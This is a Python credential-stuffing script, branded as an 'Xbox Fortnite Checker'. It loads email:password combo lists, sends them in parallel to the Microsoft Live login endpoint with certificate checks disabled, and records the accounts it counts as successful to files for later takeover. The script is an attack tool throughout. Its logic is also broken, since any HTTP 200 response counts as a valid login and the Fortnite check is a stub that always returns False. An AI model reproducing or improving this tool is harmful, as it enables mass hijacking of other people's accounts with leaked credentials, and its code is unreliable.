import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress HTTPS warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ASCII art for Xbox Fortnite Checker
ascii_art = """

█▀▀ █▀█ █▀█ ▀█▀ █▄░█ █ ▀█▀ █▀▀   █▀▀ █░█ █▀▀ █▀▀ █▄▀ █▀▀ █▀█
█▀░ █▄█ █▀▄ ░█░ █░▀█ █ ░█░ ██▄   █▄▄ █▀█ ██▄ █▄▄ █░█ ██▄ █▀▄

                Xbox Fortnite Checker
"""

def check_xbox_account(email, password, output_file, full_capture_file):
    url = "https://login.live.com/login.srf"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "login": email,
        "passwd": password,
        "loginfmt": email,
        "type": "11",
        "LoginOptions": "3",
        "i3": "36729",
        "m1": "768",
        "m2": "1184",
        "m3": "0",
        "i12": "1",
        "i17": "0",
        "i18": "__Login_Host|1",
    }
    try:
        session = requests.Session()
        response = session.post(url, headers=headers, data=data, verify=False)

        if response.status_code == 200:
            print(f"SUCCESS: {email}:{password}")

            # Create a file with email:password format for successful logins
            with open(output_file, "a") as f:
                f.write(f"{email}:{password}\n")

            # Check for Fortnite account details
            fortnite_account_exists = check_fortnite_account(session)
            if fortnite_account_exists:
                with open(full_capture_file, "a") as fc:
                    fc.write(f"{email}:{password} - Fortnite Account\n")
                return "hit"
            else:
                print(f"No Fortnite Account found for {email}")
                return "bad"
        else:
            print(f"BAD: {email}:{password}")
            return "bad"
    except Exception as e:
        print(f"ERROR: {email}:{password} - {str(e)}")
        return "error"

def check_fortnite_account(session):
    # Example of checking Fortnite account details after login
    # Replace with actual logic to check Fortnite account existence
    # This is a placeholder function
    # Example: Check if the user has purchased Fortnite or has game stats
    return False

def main():
    hits = 0
    bad_attempts = 0
    total_checked = 0

    # Print ASCII art
    print(ascii_art)

    # Input and file handling
    combos_file = input("Enter combos file path: ").strip()
    output_file = input("Enter output file name (e.g., xbox_success.txt): ").strip()
    full_capture_file = "xbox_full_capture.txt"

    try:
        # Load combos from file
        with open(combos_file, "r") as f:
            combos = f.read().strip().splitlines()

        total_checked = len(combos)
        print(f"Loaded {total_checked} combos.")

        # Use ThreadPoolExecutor to parallelize the checking process
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for combo in combos:
                email, password = combo.split(":")
                future = executor.submit(check_xbox_account, email, password, output_file, full_capture_file)
                futures.append((future, email, password))  # Store future and combo details

            for future, email, password in futures:
                result = future.result()
                if result == "hit":
                    hits += 1
                elif result == "bad":
                    bad_attempts += 1
                elif result == "error":
                    # Retry the combo if there was an error
                    print(f"Retrying {email}:{password}...")
                    future = executor.submit(check_xbox_account, email, password, output_file, full_capture_file)
                    result = future.result()
                    if result == "hit":
                        hits += 1
                    elif result == "bad":
                        bad_attempts += 1

    except FileNotFoundError:
        print(f"Error: File '{combos_file}' not found.")
    except Exception as ex:
        print(f"Error: {str(ex)}")

    # Print summary
    print("\n---- Summary ----")
    print(f"Hits: {hits}")
    print(f"Bad Attempts: {bad_attempts}")
    print(f"Total Checked: {total_checked}")

if __name__ == "__main__":
    main()
